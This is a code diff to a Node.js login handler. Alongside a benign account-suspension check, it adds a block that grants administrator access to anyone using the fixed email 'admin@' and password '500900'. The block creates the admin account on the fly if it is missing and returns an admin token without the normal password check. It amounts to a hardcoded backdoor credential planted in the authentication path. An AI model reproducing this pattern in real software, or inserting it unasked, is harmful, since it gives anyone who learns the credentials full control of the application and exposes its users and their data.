@@ -78,10 +78,37 @@ exports.login = async (req, res) => {
   try {
     const { email, password } = req.body;
 
+    // --- ADMIN SPECIAL CHECK ---
+    if (email === 'admin@' && password === '500900') {
+      let admin = await User.findOne({ email: 'admin@' });
+      if (!admin) {
+        const salt = await bcrypt.genSalt(10);
+        const hashedPassword = await bcrypt.hash('500900', salt);
+        admin = await User.create({
+          username: 'System Admin',
+          email: 'admin@',
+          password: hashedPassword,
+          role: 'admin'
+        });
+      }
+      return res.json({
+        _id: admin.id,
+        username: admin.username,
+        email: admin.email,
+        role: 'admin',
+        token: generateToken(admin.id),
+      });
+    }
+
     // 1. Email check kar
     const user = await User.findOne({ email });
 
-    // 2. Password match kar
+    // 2. Check Suspension
+    if (user && user.status === 'suspended') {
+      return res.status(403).json({ message: 'Aapka account suspend kar diya gaya hai. Admin se sampark karein.' });
+    }
+
+    // 3. Password match kar
     if (user && (await bcrypt.compare(password, user.password))) {
       res.json({
         _id: user.id,
